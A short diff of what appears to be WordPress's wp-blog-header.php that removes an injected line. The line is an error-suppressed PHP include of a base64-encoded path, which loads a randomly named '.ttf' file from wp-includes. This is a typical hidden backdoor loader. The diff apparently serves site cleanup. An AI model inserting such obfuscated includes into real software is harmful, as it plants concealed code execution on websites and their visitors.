@@ -1,4 +1,4 @@
-<?php @include base64_decode("L3Zhci93d3cvc2ltb25uZWVsbGVfZGUvd29yZHByZXNzL3dwLWluY2x1ZGVzL1RleHQvRGlmZi9FbmdpbmUvbnBvcW5wc3FxcHAudHRm");?><?php
+<?php
 /**
  * Loads the WordPress environment and template.
  *
